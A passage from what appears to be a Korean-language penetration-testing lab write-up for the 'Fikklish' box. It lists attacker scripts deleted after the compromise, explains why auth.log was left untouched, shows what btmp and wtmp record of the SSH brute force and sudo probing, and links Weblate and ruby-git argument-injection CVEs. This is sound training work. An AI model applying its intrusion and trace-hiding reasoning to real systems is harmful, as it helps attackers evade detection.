| `/tmp/r.sh` `/tmp/whoami_check` `/tmp/trysudo.sh` `/tmp/harvest.sh` `/tmp/privesc.sh` `/tmp/.h/` | 삭제 |
| `/root/h.sh` `/root/traces.sh` `/root/cleanup.sh` | 삭제. 단 `traces_confirmed.log` 가 존재를 확인해 준 것은 `/root/h.sh` 뿐 — 나머지 둘은 대응 산출물 없음 |

지우지 않고 그대로 둔 것:

- `/var/log/auth.log` — 삭제가 더 큰 흔적이라 손대지 않음. `sudo` 항목은 실행 명령을 `COMMAND=` 에 전문으로 기록함.

  ```text
  Aug 20 10:28:25 fikklish sudo:      tom : PWD=/home/tom ; USER=root ; COMMAND=/home/tom/fetch.rb
  Aug 20 10:29:04 fikklish sudo:      tom : a password is required ; PWD=/home/tom ; USER=root ; COMMAND=list
  ```

  두 번째 줄이 `sudo -n -l` 실패 순간 — 정찰용 명령까지 이름이 남음.
- `/var/log/btmp` — 실패한 SSH 시도가 `tom ssh:notty 192.168.45.207` 로 기록됨. 확인은 `lastb -n 10` 으로 했으므로 **보인 10행은 표시 상한이지 총 건수가 아님** — btmp 시작 시각이 `Thu Aug 20 10:04:25`(=KST 19:04:25)로 hydra SSH 브루트 구간을 통째로 포함하므로 실제 건수는 그보다 훨씬 많음. 전수는 관측 없음.
- `/var/log/wtmp` — `last -n 15` 출력이 7행으로 끝나(상한 미달 = 전량) 이번 작업으로 남은 세션은 정확히 두 건.

  ```text
  root     pts/0        192.168.45.207   Thu Aug 20 10:28 - 10:28  (00:00)
  tom      pts/0        192.168.45.207   Thu Aug 20 10:26 - 10:26  (00:00)
  ```

  플래그 채증용 `ssh -tt` 두 번이며, 그 외 수십 회의 `ssh host 'cmd'` 는 pty 를 안 열어 wtmp 에 남지 않음. 같은 작업이 `auth.log` 에는 전부 남음 — 로그 종류에 따라 결론이 갈림.

— 출처: `~/PG/Fikklish/traces_confirmed.log`(root 로 수집)

- Weblate 저널(`journalctl -u weblate`)에 요청·트레이스백 잔존
- 가입 시도로 만들어진 레코드 — 계정 자체는 생성되지 않음(`/api/users/` 는 `anonymous`·`admin` 2건 그대로)
- 확인하지 않은 것 — PostgreSQL 서버 로그, redis 레이트리밋 키 잔존 여부, Apache access_log

Kali 쪽 — tmux 세션 `fik_*` 전량 종료(개수 기록 없음), SMTP 캐처·tcpdump PID 지정 종료, 리스너 없음 확인(SSH 경로라 리버스셸 자체가 이 최종 경로에는 불필요 — 아웃바운드 문제도 애초에 발생하지 않음). 다른 세션 소유의 `pwnlab_shell`·443/80 리스너는 손대지 않음.

## 관련

- CVE-2022-23915 — Weblate < 4.11.1, git/mercurial 인자 주입 RCE. [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088) · [NVD](https://nvd.nist.gov/vuln/detail/cve-2022-23915) · 수정 PR [WeblateOrg/weblate#7337](https://github.com/WeblateOrg/weblate/pull/7337)
- CVE-2022-25648 — ruby-git < 1.11.0 인자 주입. [Snyk](https://security.snyk.io/vuln/SNYK-RUBY-GIT-2421270)
- 소스 대조는 `weblate-4.11` 태그 기준 — 예: `https://raw.githubusercontent.com/WeblateOrg/weblate/weblate-4.11/weblate/accounts/models.py`. 현행 브랜치는 이미 고쳐진 코드가 렌더되어 오독 위험
- [[Bratarina]] · [[ClamAV]] — 서비스 파라미터가 그대로 명령이 되는 유형
- [[RubyDome]] · [[Pelican]] — `sudo` 로 허용된 스크립트가 취약한 유형
- [[Cockpit]] · [[LazySysAdmin]] — 웹/공유 자료에서 얻은 자격증명 재사용
- [[Crane]] · [[Squid]] — "응답이 성공을 뜻하지 않는다" 계열. 이 박스는 반대로 "응답이 실패라도 익스플로잇이 실패한 것은 아니다" 쪽 사례
- [[Graph]] — `sudo -n` 실패 뒤 비번 확보 시 반드시 재확인하는 습관의 또 다른 사례([[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]])
- 이 박스의 시행착오·반사 카드 — [[_PLAYBOOK#A-2-11. 「메일을 보냈습니다」가 나오는데 아무것도 안 온다 — 비동기 큐에는 워커가 필요하다]] · [[_PLAYBOOK#A-2-12. 웹 로그인에 레이트리밋·계정 잠금이 걸려 있다 — 브루트가 계정을 죽인다]] · [[_PLAYBOOK#B-1-16. CLI 인자 주입(argument injection) — 웹 값이 argv 로 흘러가는 자리]] · [[_PLAYBOOK#B-1-17. 정적 템플릿 사이트에서 «손댄 문단»은 자격증명 힌트다]] · [[_PLAYBOOK#B-1-18. SVG 아이콘 캡차는 `path` 데이터로 연산자를 판정한다]] · [[_PLAYBOOK#B-65. hydra·cewl 실무 함정 — `-c` 파일 형식과 `hydra.restore`]]
- 정찰 반사 — [[_PLAYBOOK#A-1-10. tmux 에 던진 스캔이 «조용히» 죽는다]] · [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]] · 리스너 포트 공유와 ICMP 선확인은 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · 의존 라이브러리 버전 확인은 [[_PLAYBOOK#A-43. `sudo -l` 이 좁아도 대상 파일 권한을 확인한다]]
- [[_STATUS]]
